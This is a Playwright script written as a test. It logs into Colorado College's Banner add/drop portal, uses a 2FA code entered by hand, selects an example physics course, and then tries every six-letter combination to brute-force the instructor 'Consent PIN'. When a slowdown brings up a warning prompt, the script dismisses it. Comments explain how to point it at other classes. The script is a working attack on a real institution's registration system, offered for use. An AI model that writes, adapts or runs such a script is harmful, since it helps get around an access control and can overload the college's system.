import { test, Page } from "@playwright/test";
test.use({ storageState: { cookies: [], origins: [] } });
// do not use $npx playwright test
test('brute force', async function ({ page }: { page: Page }) {

    const username: string = ""; // enter your username here
    let password: string = ""; // your password here too

    await page.goto('https://banxel.coloradocollege.edu/BannerExtensibility/customPage/page/CCStudentAddDrop');
    await page.getByLabel('Username').fill(username);
    await page.getByLabel('Password').fill(password);
    await page.getByRole('button', { name: 'LO' }).click();

    await page.getByRole('button', { name: 'Send a passcode' }).click();
    const code: string = ''; // change 2FA code in debugger, add breakpoint on next line
    if (code !== null) {
        await page.getByRole('textbox', { name: 'Passcode' }).fill(code);
        await page.getByTestId('verify-button').click();
    } else {
        throw new Error("No passcode entered.");
    }

    // the code below should be edited to target the class you want the PIN code for
    // the class atributes below are an example for PC242, block 2, fall 2025, taught by Dr. DK
    // these can also be found by using playwright's locator tool
    await page.getByRole('button', { name: 'Search Class Schedule' }).click();
    await page.locator('#pbid-SearchTermSelect').selectOption('string:202610'); // string:202610 is fall 2025 semester
    await page.getByLabel('Subject').selectOption('string:PC'); // string:PC is physics department
    await page.getByRole('button', { name: 'Class Search' }).click();
    await page.getByRole('row', { name: '17494 PC242 2211 Physics for' }).getByLabel('').click(); // 174... is the name that appears on the dropdown menu
    await page.getByLabel('Grading Track').selectOption('string:G'); // string:G is for letter grades


    await page.getByRole('button', { name: 'Continue' }).click();
    await page.getByRole('listitem').click();
    let pins: string[] = [];

    for (let i = 1; i <= 308915776; i++) {
        let start = new Date().getTime();
        await page.getByRole('textbox', { name: 'Consent PIN' }).click();
        await page.getByRole('textbox', { name: 'Consent PIN' }).fill(combo(i));
        await page.getByRole('button', { name: 'Continue' }).click();
        let end = new Date().getTime();
        if ((end - start) > 2000) {
            page.getByRole('button', { name: 'Warning prompt notification' }).click();
        }
        try {
            await page.getByRole('listitem').click();
        } catch (error: unknown) {
            console.log("code found = " + combo(i));
            pins.push(combo(i));
            return;
        }
    }
});

export function combo(index: number): string {
    const LENGTH = 6;
    const BASE = 26;
    const MAX = Math.pow(BASE, LENGTH); // 26^6 = 308,915,776

    if (!Number.isInteger(index) || index < 1 || index > MAX) {
        throw new RangeError(`index must be an integer in [1, ${MAX}]`);
    }

    // Convert to 0-based value
    let val = index - 1;

    // Build characters from right to left
    const chars = new Array<string>(LENGTH);
    for (let i = LENGTH - 1; i >= 0; i--) {
        const digit = val % BASE;               // 0..25
        chars[i] = String.fromCharCode(65 + digit); // 65 = 'A'
        val = Math.floor(val / BASE);
    }

    return chars.join("");
}
